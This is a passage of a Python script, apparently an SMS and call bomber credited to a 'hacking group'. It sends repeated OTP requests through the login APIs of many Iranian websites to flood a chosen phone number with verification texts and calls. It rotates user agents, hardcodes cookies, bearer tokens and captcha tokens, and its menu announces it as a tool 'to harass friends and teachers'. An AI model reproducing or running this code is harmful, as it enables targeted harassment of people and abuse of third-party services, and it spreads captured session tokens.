            'Content-Type': 'application/json','Referer': 'https://app.tetherland.com/','Origin': 'https://app.tetherland.com',
            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',}
        json_data = {'mobile': Phone_NOMBER,
            'device_info': {'brand': '','model': '','browserVersion': '134.0','app_version': '','by': 'web','osName': 'KALI',
            'osVersion': 'XP','browserName': 'TOR','platform': 'web','name': 'Mac','device': 'web',},'otp_type': 'sms','device': 'web',}
        response = requests.post('https://service.tetherland.com/api/v5/login-register', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### azkivam ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Referer': 'https://azkivam.com/','Origin': 'https://azkivam.com',
            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',}
        json_data = {'mobileNumber': Phone_NOMBER,}
        response = requests.post('https://api.azkivam.com/auth/login', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### karabiz ###############################
        cookies = {'analytics_campaign': '{%22source%22:%22bing%22%2C%22medium%22:%22organic%22}',
            '_clck': '3pq8c9%7C2%7Cft5%7C0%7C1861','_ga': 'GA1.2.1829654683.1738665403','_gid': 'GA1.2.2014610419.1738665403','_clsk':
            '1btamvn%7C1738668025116%7C1%7C1%7Cx.clarity.ms%2Fcollect',}
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Referer': 'https://panel.karabiz.ir/signup','Origin': 'https://panel.karabiz.ir',
            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Connection': 'keep-alive',}
        json_data = {'Mobile': Phone_NOMBER,'SchoolId': -1,'url': 'panel.karabiz.ir','identifierCode': '',}
        response = requests.post('https://panel.karabiz.ir/api/api/user/signup', cookies=cookies, headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### mohit ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en',
            'Referer': 'https://mohit.online/','Content-Type': 'application/json','Origin': 'https://mohit.online',
            'Connection': 'keep-alive','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'username': Phone_NOMBER,'app': 'market',}
        response = requests.post('https://api.mohit.online/api/auth/login', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### melico ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Referer': 'https://my.melico.ir/','Origin': 'https://my.melico.ir','Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',}
        json_data = {'username': Phone_NOMBER,'group': 'my','recaptcha_token': 'abcd',}
        response = requests.post('https://melico.ir/auth/check-user', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### erythron ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Origin': 'https://dashboard.erythron.net','Connection': 'keep-alive',
            'Referer': 'https://dashboard.erythron.net/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'auth_type': 'mobile','auth_value': Phone_NOMBER,}
        response = requests.post('https://api.erythron.net/v1/user/getVerifyCode', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### balad ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','device-id': '664f06ae-f2f1-457c-ade1-3461da43cd77','Origin': 'https://balad.ir',
            'Connection': 'keep-alive','Referer': 'https://balad.ir/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'phone_number': Phone_NOMBER,'os_type': 'W',}
        response = requests.post('https://account.api.balad.ir/api/web/auth/login/', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### tapsi - food ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Referer': 'https://tapsi.food/','x-platform': 'desktop','x-app-version': 'v1.2.09-prd',
            'Origin': 'https://tapsi.food','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJHdWVzdElkIjoiN2UwZTRlZDctMmQwOS00YjRhLWE5MWQtOGQxOWU2ZDNhMzZmIiwiVHlwZSI6Ikd1ZXN0IiwiRXhwaXJlSW4iOiIxMDgwMDAwMCIsIm5iZiI6MTczODY2NTI4MywiZXhwIjoxNzM4Njc2MDgzLCJpYXQiOjE3Mzg2NjUyODMsImlzcyI6Imh0dHBzOi8vbG9jYWxob3N0OjUwMDEiLCJhdWQiOiJodHRwczovL2xvY2FsaG9zdDo1MDAxIn0.hDHynEnlIoHInmRueMYoCdEvAlH1E1PAwbrWTd2-su0',
            'Connection': 'keep-alive','Priority': 'u=0',}
        json_data = {'cellPhone': Phone_NOMBER,}
        response = requests.post('https://api.tapsi.food/v1/api/Authentication/otp', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### tapsi - shop ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','authorization': 'Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjFCNEJCQ0EyN0MxREJDNjdGMjdGRDIxMTBGQTUxNTA2NjMxMTExQkFSUzI1NiIsIng1dCI6IkcwdThvbndkdkdmeWY5SVJENlVWQm1NUkVibyIsInR5cCI6ImF0K2p3dCJ9.eyJpc3MiOiJVbmtub3duQ3VzdG9tZXIudGFwc2kiLCJuYmYiOjE3Mzg2NjUyNjcsImlhdCI6MTczODY2NTI2NywiZXhwIjoxNzM4NjY1MjY3LCJhdWQiOiJVbmtub3duQ3VzdG9tZXIudGFwc2kvcmVzb3VyY2VzIiwic2NvcGUiOlsiYXBpX0d1ZXN0TW9kZSJdLCJjbGllbnRfaWQiOiJndWVzdE1vZGUiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJVbmtub3duQ3VzdG9tZXIiLCJndWVzdElkIjoiMTMzNjI4MzcyOTAxMjYwNDkyOCIsInBhbmVsVHlwZSI6IkJ1eWVyIiwicmVtb3RlSXBBZGRyZXNzIjoiOjpmZmZmOjEwLjQyLjEwLjQ2IiwianRpIjoiOTc0NkIzM0E1M0NCQUI5NjkyOUU5QjkyQjYzMDhFRkMifQ.BgbGX8kRu5EzcWs5NKf23Jc4zE4ASMgeXG4P277bV9erqjuc5yjvQ_KwOWj5x0gZpyGS7amWIbwPHVHS8TAEk0y0-UDWZTnbbzBflKVt1SwyDVMW4rrqFArs8FhA7w5aMCio_iqODnxnJDQVMRem0f9-a_ZXcCkVc5m86hOkf2X1RrR7CfhN5fQp43Vtc90IYeStJbovaTdfWKoQoUHyn1QLg00LPEg8eFpIlEbFm4RlWd13AWOnZiN1EbTNhEzv4l2BxQteF3wFOab0b5NkyRGMnx9N-k9OdbZXxLDvkOeCalA_A_IKA-pCXGKdaiOUvz07A1I7gHe-1MmJVOsVKg',
            'client-name': 'qcommerce.tapsi.shop','client-version': '0.1.28','Origin': 'https://tapsi.shop','Connection':
            'keep-alive','Referer': 'https://tapsi.shop/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site':
            'same-site','Priority': 'u=0',}
        json_data = {'activityType': 46,
            'parameters': '{"PlatformType":0,"PlatformTypeTitle":"Website","AnonymousId":"8cc57c8d26eb3d1338aaf6f80d2121f493e9bf87","ClientSessionId":"8cc57c8d26eb3d1338aaf6f80d2121f493e9bf87","phone_number":"'+Phone_NOMBER+'"}',}
        response = requests.post('https://qcommercegw.tapsi.shop/Insight/api/Activity', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### divar ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded','Referer': 'https://divar.ir/','X-Screen-Size': '1366x653',
            'X-Standard-Divar-Error': 'true','Origin': 'https://divar.ir','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',}
        data = '{"phone":'+Phone_NOMBER+'}'
        response = requests.post('https://api.divar.ir/v5/auth/authenticate', headers=headers, data=data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### dgshahr ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Origin': 'https://lend.dgshahr.com','Connection': 'keep-alive','Referer':
            'https://lend.dgshahr.com/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'phone_number': Phone_NOMBER,'source': ' bing-organic',}
        response = requests.post('https://lend-b.dgshahr.com/user/login/', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### tapsi ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Referer': 'https://co.tapsi.ir/','Origin': 'https://co.tapsi.ir','Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',}
        json_data = {'profile': {'companyName': 'Hack API','companyPhoneNumber': '0999999999999','adminName': 'Hack API',
            'adminPhoneNumber': Phone_NOMBER,'email': 'Hack API','referrerCode': '',},
            'product': 'CORPORATE','g-recaptcha-response': '',}
        response = requests.post('https://api.tapsi.ir/api/v2.1/user/corporate/register/checkProfile', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### banimode ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json;charset=utf-8','platform': 'TOR','Origin': 'https://www.banimode.com',
            'Connection': 'keep-alive','Referer': 'https://www.banimode.com/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'phone': Phone_NOMBER,}
        response = requests.post('https://mobapi.banimode.com/api/v2/auth/request', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### drnext ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'fa',
            'Content-Type': 'application/json','Referer': 'https://drnext.ir/','Origin': 'https://drnext.ir','Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive',}
        json_data = {'source': 'besina','mobile': Phone_NOMBER,'key': 
                'U2FsdGVkX1+AyVp5xS3U1oGWY71Lz96C4QLFqonCE7m9UequPXgurk8MdF5nb5Nu/uPJ4+OlOrohOpgZTVsYKg==',}
        response = requests.post('https://cyclops.drnext.ir/v1/patients/auth/send-verification-token', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### ibime ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Origin': 'https://ibime.com','Connection': 'keep-alive','Referer': 'https://ibime.com/',
            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'phoneNumber': Phone_NOMBER,}
        response = requests.post('https://api.ibime.com/web/v1/account/otp', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### erythron SMS###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Origin': 'https://dashboard.erythron.net','Connection': 'keep-alive',
            'Referer': 'https://dashboard.erythron.net/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'auth_type': 'mobile','auth_value': Phone_NOMBER,}
        response = requests.post('https://api.erythron.net/v1/user/getVerifyCode', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")

def Both_BOMBER():
    Phone_NOMBER = input(F"{g}Enter Nomber For SMS and CALL BOMBER : \n  For example : 09123456789 \n  $-")
    Both = input(F"\n\nEnter Nomber Send SMS and CALL : ")
    print("\n!!For Stop enter ctrl+C !!\n")
    for i in range(int(int(Both))):
        ############################### tetherland CALL###############################
        headers = {
            'User-Agent': USERS.r_ua(),
            'Accept': 'application/json','Accept-Language': 'en-US,en;q=0.5','Content-Type': 'application/json',
            'Referer': 'https://app.tetherland.com/','Origin': 'https://app.tetherland.com','Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',
        }
        json_data = {'mobile': Phone_NOMBER,
            'device_info': {'brand': '','model': '','browserVersion': '432.0','app_version': '','by': 'web','osName': 'kali',
            'osVersion': 'XP','browserName': 'TOR','platform': 'web','name': 'TEMOX','device': 'web',
            },'otp_type': 'call',
            'device': 'web',
        }
        response = requests.post('https://service.tetherland.com/api/v5/login-register', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
        else : print(f"{R}{w}NOT SEND CALL :(")
        ############################### shabdiz SMS###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.shabdizgroup.com/','Origin': 'https://www.shabdizgroup.com',
            'Connection': 'keep-alive','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',}
        params = {'phoneNumber': Phone_NOMBER,}
        response = requests.get('https://paneladmin.shabdizgroup.com/api/App/RequestVerifyCode', params=params, headers=headers)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### ibime SMS###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Origin': 'https://ibime.com','Connection': 'keep-alive','Referer': 'https://ibime.com/',
            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'phoneNumber': Phone_NOMBER,}
        response = requests.post('https://api.ibime.com/web/v1/account/otp', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### banimode SMS###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json;charset=utf-8','platform': 'TOR','Origin': 'https://www.banimode.com',
            'Connection': 'keep-alive','Referer': 'https://www.banimode.com/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
        json_data = {'phone': Phone_NOMBER,}
        response = requests.post('https://mobapi.banimode.com/api/v2/auth/request', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### vitrin CALL###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','V-Session-ID': 'f06009c5-70d9-448e-b413-035e61a952fe','V-Fingerprint-ID':
            'f0e133830f31be0bffd26154f5ac7f0d','X-XSRF-TOKEN': 
            'eyJpdiI6ImVvVVF1bzlWd2tyR3lyNlpEMUU1M3c9PSIsInZhbHVlIjoiUHBMWTN4clQ4Nk9OV1F1b1VuOU4xdHo3cEdzVVJkN2RoQUpvQS9Zc3JZK3hFZm90azBpWEhDYlA1ekFVL21jbldWRWREWUtPc3lubXZ5cUZRQjFPajR0NjBnVmZNRE5NVkFHaE44WjRoNy9BSEpncXRqRW9Eem92WXVqMGFmU0IiLCJtYWMiOiI2MjNjMWM2M2FmYjIwNWJkYmY2MWU0MzdhNDZjZmI2NjY0Y2RkMDg5OGZhOWE2MDFjZGE3ODgzMWY4OGEwODVmIiwidGFnIjoiIn0=',
            'Origin': 'https://www.vitrin.shop','Alt-Used': 'www.vitrin.shop','Connection': 'keep-alive','Referer':
            'https://www.vitrin.shop/login','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Priority': 'u=0',}
        json_data = {
            'phone_number': USERS.r_ua(),
            'forgot_password': False,}
        response = requests.post('https://www.vitrin.shop/api/v1/user/request_code', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
        else : print(f"{R}{w}NOT SEND CALL :(")
        ############################### faradars SMS###############################
        cookies = {
            '_ga_MCXYH70MBX': 'GS1.1.1716381662.1.1.1716381703.0.0.0',
            '_ga': 'GA1.2.8330733.1716381663',
            '_ga_1SSNSBRK00': 'GS1.1.1716381663.1.1.1716381703.0.0.0',
            '_clck': '1uxxq72%7C2%7Cflz%7C0%7C1603',
            '_clsk': 'qhq9gz%7C1716381703881%7C3%7C1%7Cz.clarity.ms%2Fcollect',
            'laravel_session': 'eyJpdiI6InRpZUVuTmFib0VoOEZNL1VhV2l4cFE9PSIsInZhbHVlIjoiMzV3UjdrNzhFTW1WVmVobUZWMXgvd2ljdHI2eXZBdzlEd09BYlVXM1AydTd0QzdpSk9HMW0zcy9nZFRWZnV6clAxM3dmbWNEWVIwWCtIUSs4dENwWkJSTEZsOUVZUUllTVF3Vmk1emdXS3pIOGp0V3M1RjhDdkk4cTNBOUVTZ3YiLCJtYWMiOiI2NGE1YzRmNjVjZWQyOTI1M2NjNTkyNjkzNTA1NGMyMmVlYjJmNDdhNmVmNzYzODU3MzQ1NzdlMDU4M2ZmMzYzIiwidGFnIjoiIn0%3D',
            'fara_dars_guest_shopping_cart_04a036a898e2a750d91742f88b2d8599': 'Yk5XNTgwL21sVHlYSFpOY3pSOVhBazdqbkY0S3Ntc3M2cGJrZnRmRm1CU2dIbTBCVkM4a3A5OFZNQUhBc1FHWQ%3D%3D',
            '_gid': 'GA1.2.789109954.1716381702',
            '_gat_gtag_UA_50789780_1': '1',
            '_hjSessionUser_3638482': 'eyJpZCI6ImUzNTQzZTQzLTZjYzQtNWY2Ny04ZTBmLTA3NWZjZTY5MjA0NiIsImNyZWF0ZWQiOjE3MTYzODE3MDQ2MzAsImV4aXN0aW5nIjpmYWxzZX0=',
            '_hjSession_3638482': 'eyJpZCI6IjU4NGUwNzRjLWM4YTktNDhjZS1iZmQ5LTNiYWI5Y2Y4NDc1YiIsImMiOjE3MTYzODE3MDQ2MzEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',}
        headers = {
            'User-Agent': USERS.r_ua(),'Accept': 'application/json','Accept-Language': 'EN','Content-Type': 'application/json',
            'Nextjs': 'true','Current-Url': 'https://faradars.org/register','Origin': 'https://faradars.org','Connection': 'keep-alive',
            'Referer': 'https://faradars.org/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',}
        json_data = {'mobile': Phone_NOMBER,
            'g-recaptcha-response-v3': '03AFcWeA7KhJEAQjyWzwyTbSyYR52rJMJgXekgy2U-8-cUVZIYt2mDcOALct9r5D7iTb7vqbtw1RKSZstIkf8FEAOMj9hVTp18oEnnRA87sa1_ky3BLwnA8MPLOmNLjlFdy2Hjqj53LMnP5zWIdIq1WphjibicA5krlxGAyb2pTkZ_qNfT-lF4UiZU38N0Vsd8Vqdg1kJUaDGVkXSj_6BvJTB-IgQmFTxk3YaRrKfQTtrvKjkKPuOn5daqOSvHv3_UE5CPOcUV4_0gjAiRrlsF-l9hKkdSFH_BmbL166WFRaTXHKASE0Qnd5rBdzJZHs_CDK7-xa6_Ym-jN2dlA5NqDUyjowtNOEY6zSEFDIMlx8LkR_ObH8AEbpXo_JsUUjVS16hqgqgJl4Cdzn4iXQfM_Ha5PUQqO_WljYfbdsbD9vb9yEuH7CE1XybP7VNTUF0yIB_lcaSlI0CJxPF5rFuNQUNgUvGvYQFsN-p-LGJBD_rnT8zXxwvakkoh_cxmB3K6fWOaNTQ05yKSGSc2n07nKVDF8pzIhvTfFAFU3QMqjy0Oh-1werTscoeJPDa3POh1BuT4-uzXj-JVtdR7ZIXZTYkWyhi7ontIa6jVXbAbZ3PbnqB-BJhvMDbHRHD3sfPM0zRjQRuHKZFsUOLMIEAxB33jzf5Z9QQo8Q',
            'digits': 5,'platforms': 'web','source': 'faradars',}
        response = requests.post('https://api.faradars.org/api/client/v1/auth/otp', cookies=cookies, headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### namava SMS###############################
        cookies = {'use_legacy_player': 'false','dv-v3': '{"g":"desktop","platform":null}',
            'guest_token': '0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5',
            'anonymous_login': 'true','_clck': '3i1wnq%7C2%7Cflz%7C0%7C1603','_ga': 'GA1.2.15020820.1716382006',
            '_gid': 'GA1.2.343377359.1716382006','analytics_session_token': '7a7972f5-83c4-9df7-8d34-803934ea2b69',
            'analytics_token': 'e24f424b-f88f-957b-c1d4-b76a251e506c','yektanet_session_last_activity': '5/22/2024','_yngt_iframe': '1',
            '_ga_9XXJ5QGRKG': 'GS1.2.1716382007.1.1.1716382312.31.0.0','_yngt': 'a7f00977-71cf2-24d3f-f1766-6f8787595a1aa',
            '_ga_X8RD5LS5K2': 'GS1.1.1716382009.1.1.1716382303.0.0.0','_clsk': '15384v8%7C1716382303413%7C4%7C1%7Cwww.clarity.ms%2Feus2-c%2Fcollect',
            'auth_nounce': 'YWENFvF1pH5DZkt3lvJ_c1ezUjGfyF1zaLUNvAh2t-rXDDDBi26VKUbji7yLTLLP2btkbVMigz55ACbxIpWMAA2',}
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json;charset=utf-8','X-Application-Type': 'WebClient','X-Client-Version': '2.64.0',
            'X-Auth-Token': '0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5',
            'Origin': 'https://www.namava.ir','Connection': 'keep-alive','Referer': 'https://www.namava.ir/auth/register-phone',
            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin',}
        json_data = {'UserName': "+98"+Phone_NOMBER[1:],}
        response = requests.post('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request',
            cookies=cookies,headers=headers,json=json_data,)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### digikala CALL###############################
        cookies = {'_sp_ses.13cb': '*',
            '_sp_id.13cb': '61e94fa0-5aa7-4285-9b6f-ce4b803ce271.1716379964.1.1716379977..e384d6ca-b1db-4721-830a-cfdcd7b8ce4e..ceb21d11-1f69-4c9a-9d4e-f8f1a7c97321.1716379963875.10',
            'tracker_glob_new': 'ciewu5l','tracker_session': '67dWL5g',
            'TS01c77ebf': '0102310591f244d51ddc52bfd04667750d1f725ffd622e78cfa9e082d3bb09fcb31428e5deb0c512ef587fd539eb24356a941d0f3a809ae9595f99fda20f00ab669f9cf59b',
            'TS01b6ea4d': '01023105919be6b3f1260381dd1528074f4c53f743622e78cfa9e082d3bb09fcb31428e5defbcb1143435583a505556ef8f47251de02233d5f52e4ec5bc17f030546505439cff876c305d5eb3c387948c931aeaa0c',
            'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
            '_ga_QQKVTD5TG8': 'GS1.1.1716379968.1.1.1716379978.0.0.0','_ga': 'GA1.1.1878235439.1716379968',}
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Referer': 'https://www.digikala.com/','X-Web-Optimize-Response': '1',
            'X-Web-Client': 'kali','Origin': 'https://www.digikala.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Connection': 'keep-alive',}
        json_data = {'backUrl': '/','username': Phone_NOMBER,'otp_call': True,}
        response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
        else : print(f"{R}{w}NOT SEND CALL :(")

def SEE_WE():
    print(f"""\n\n\n\n\n\n\n
{R}{g}Black Cactus Hacking Group
{Y}{bl}🌐🏴‍☠HACKERS_WORLED
A channel for education - news - tricks - hacking - Kali and Termux tools
With support for three languages: English, Persian and Arabic

{B}Telegram ->\n {R}{y}@Grup_Hacking_Cactus_Black
{B}YouTube  ->\n {R}{y}@Grup_Hacking_Cactus_Black\n""")
    input("enter 01010110001")
    main()

def main():
    print(f"""
    Hello
    Welcome to the tool to harass friends and teachers
    Tools in this pack:
    {G}[1]{P} : {g}Call Bomber{w}
    {G}[2]{P} : {g}SMS Bomber{w}
    {G}[3]{P} : {g}Both{w}
    {G}[4]{P} : {g}Contact Us{w}
    {G}[5]{P} : {g}Exit{w}

    {R}{g}**This tool is free and designed by the Black Cactus hacking group**{w}{P}
    """)
    USE_OF = input(f"{R}Terminal\n   $-> {R}")
    if USE_OF == 1 : CALL_BOMBER()
    if USE_OF == 2 : SMS_BOMBER()
    if USE_OF == 3 : Both_BOMBER()
    if USE_OF == 4 : SEE_WE()
    if USE_OF == 5 : exit()


main()
